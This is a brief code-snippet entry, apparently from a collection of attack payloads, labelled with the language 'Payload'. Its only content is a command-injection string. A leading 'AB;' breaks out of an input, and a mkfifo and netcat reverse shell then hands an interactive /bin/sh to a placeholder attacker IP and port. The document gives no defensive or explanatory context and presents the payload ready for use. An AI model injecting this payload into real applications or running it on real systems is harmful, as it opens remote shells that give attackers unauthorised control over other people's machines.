---
id: 3664c8bd-597a-4c2b-bb9b-ff0c69de5d58
type: code
language: Payload
verified: false
created_at: '2020-03-17T05:41:42.939680+00:00'
updated_at: '2023-05-29T16:48:53.365139+00:00'
---

# Code Snippet 3664c8bd

**Language**: Payload

```payload
AB;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $_ATTACKER_IP $_ATTACKER_PORT >/tmp/f
```
